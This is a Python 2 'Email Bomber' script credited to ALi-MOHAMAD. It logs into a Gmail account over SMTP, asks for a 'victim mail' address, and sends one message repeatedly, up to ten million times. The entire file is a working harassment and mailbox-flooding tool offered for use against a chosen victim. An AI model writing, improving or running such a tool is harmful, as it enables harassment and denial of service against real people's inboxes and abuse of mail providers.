#!/usr/bin/python
#E-bomber



import os
import smtplib
import getpass
import sys
import time

print '                                                                    '
print '                                                                    '
print '            +===============================================+       '
print '            |                Email Bomber                   |       '
print '            |^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^|       '
print '            |             create ALi-MOHAMAD                |       '
print '            |             Contact :                         |       '
print '            |      \033[34m       FACEBOOK\033[37m & \033[31mGITHUB     \033[37m            |       '
print '            | +--> https://www.facebook.com/ALi20Hack       |       '
print '            | +--> https://github.com/ALi20hack             |       '
print '            |                                               |       '
print '            +===============================================+       '

print '                                                                    '


print '                                           '

print '    '
email = raw_input('\033[31m[\033[33m+\033[31m]\033[37m G-mail Address : ')
print '             '
user = raw_input('\033[31m[\033[33m+\033[31m]\033[37m Your Name : ')
print '      '
passwd = getpass.getpass('\033[31m[Password]: \033[37m')

print '   '

to = raw_input('\nTo : \033[31m[write victim mail] : \033[37m')


print '    '

body = raw_input('Message: \033[31m[ your message ] : \033[37m')

print '    '

total = input('Number of send:\033[31m[1-10000000] : \033[37m')

smtp_server = 'smtp.gmail.com'
port = 587


print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    server.starttls()
    server.login(email,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + '\n' + body
        server.sendmail(email,to,msg)
        print "\r\033[32mE-mails sent:\033[37m %i" % i
        time.sleep(1)
        sys.stdout.flush()
    server.quit()
    print '\n \033[33mDone !!!\033[37m'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] \033[31mThe username or password you entered is incorrect.'
sys.exit()
